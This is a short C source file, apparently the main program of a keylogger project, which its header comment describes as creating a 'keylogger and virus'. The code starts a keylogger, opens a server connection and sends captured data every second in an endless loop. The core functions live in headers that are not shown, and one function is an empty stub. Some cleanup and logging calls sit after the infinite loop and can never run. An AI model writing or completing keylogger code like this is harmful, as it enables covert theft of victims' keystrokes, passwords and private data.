/*
Main function to run to create keylogger and virus
*/

#include "keylogger.h"
#include "client.h"
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>

void background_process(void) {
  // implementation here
}

void main(void) {
  background_process();
  begin_keylogger();
  open_server();

  pid_t my_pid = getpid();
  while (1) {
    transmit_data();
    //printf("%d\n",(int)my_pid);
    sleep(1);
  }
  end_keylogger();
  close_server();
  // background_process();
  // begin_keylogger();
  // open_server();
  // while (1) {
  //   transmit_data();
  // }
  // end_keylogger();
  // close_server();

  key_package key_package;
  key_package.keys_arr_size = 0;
  log_device(&key_package);
  log_keys(&key_package);
}
